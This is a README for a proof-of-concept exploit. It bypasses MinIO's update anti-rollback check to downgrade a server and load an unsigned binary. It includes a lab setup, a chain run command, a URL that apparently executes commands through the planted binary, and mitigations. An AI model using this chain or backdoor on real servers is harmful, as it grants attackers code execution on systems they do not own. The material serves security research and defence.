# MinIO ServerUpdate Anti-Rollback Bypass — PoC

`POST /minio/admin/v3/update` decides whether a release is "newer" from a date in
an **unsigned, attacker-supplied filename**, and that check runs *before* the
signature check. A caller holding `admin:ServerUpdate` serves a genuine, older
MinIO-signed binary under a future-dated filename to downgrade the server, then —
once rolled back to a release that predates the built-in signing key
(`RELEASE.2023-03-13T19-46-17Z`) — loads an **unsigned** binary that runs as the
service account.

Affected up to and including the final community release
`RELEASE.2025-10-15T17-29-55Z`. The `minio/minio` repository is archived; no fix.

> Security research / defensive use only. Runs against a local lab you control.

## Demo

[`video-poc.mp4`](poc/video-poc.mp4)

## Lab

```bash
cd lab
```

```bash
docker compose up -d
```

MinIO on `127.0.0.1:9000` (console `:9001`), creds `minioadmin:minioadmin`.

## Run

```bash
py poc/poc.py -t http://127.0.0.1:9000 -s <Server> chain
```
Shell

```bash
http://127.0.0.1:9000/login?alive=id
```

## Mitigation

- Deny `admin:ServerUpdate` in every IAM policy.
- Set `MINIO_UPDATE=off` — the endpoint then returns HTTP 405.
- Keep the admin API off untrusted networks.
